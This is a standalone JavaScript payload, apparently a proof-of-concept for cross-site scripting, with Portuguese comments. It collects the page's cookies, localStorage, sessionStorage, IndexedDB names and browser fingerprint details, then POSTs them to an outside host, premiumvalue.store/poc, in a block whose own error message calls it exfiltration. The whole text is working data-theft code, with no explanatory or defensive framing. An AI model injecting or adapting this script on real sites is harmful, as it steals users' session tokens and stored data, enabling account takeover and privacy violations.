(async () => {
  const data = {
    timestamp: new Date().toISOString(),
    url: location.href,
    referrer: document.referrer,
    cookies: document.cookie,
    userAgent: navigator.userAgent,
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth
    },
    navigator: {
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      deviceMemory: navigator.deviceMemory,
      hardwareConcurrency: navigator.hardwareConcurrency
    },
    localStorage: JSON.stringify({ ...localStorage }),
    sessionStorage: JSON.stringify({ ...sessionStorage }),
    indexedDBs: []
  };

  try {
    // Enumerar IndexedDBs (alguns navegadores permitem listar)
    if (indexedDB.databases) {
      const dbs = await indexedDB.databases();
      data.indexedDBs = dbs.map(db => db.name || 'unknown');
    }
  } catch (e) {
    data.indexedDBs = ['unavailable'];
  }

  try {
    await fetch('https://premiumvalue.store/poc', {
      method: 'POST',
      body: JSON.stringify(data),
      headers: { 'Content-Type': 'application/json' },
      mode: 'no-cors'
    });
  } catch (e) {
    console.error('Exfiltration failed:', e);
  }
})();
